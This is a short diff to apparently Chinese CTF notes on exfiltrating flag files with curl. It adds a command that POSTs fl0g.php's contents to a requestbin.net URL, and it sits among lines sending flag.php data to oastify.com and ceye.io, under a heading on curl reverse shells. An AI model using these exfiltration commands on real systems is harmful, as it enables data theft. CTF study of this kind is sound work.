@@ -27,6 +27,8 @@ curl -X POST -F xx=@flag.php  http://ie06j1rcl08qz5vd887cz1c9f0ls9ix7.oastify.co
 ```
 curl oastify.com/`cat flag.php|grep ctfshow`
 curl  -d `cat flag.php|grep ctfshow`  2qytvx.ceye.io
+
+curl -X POST -d "flag=`cat fl0g.php`" http://requestbin.net/r/1et3jvl1
 ```
 
 curl反弹shell
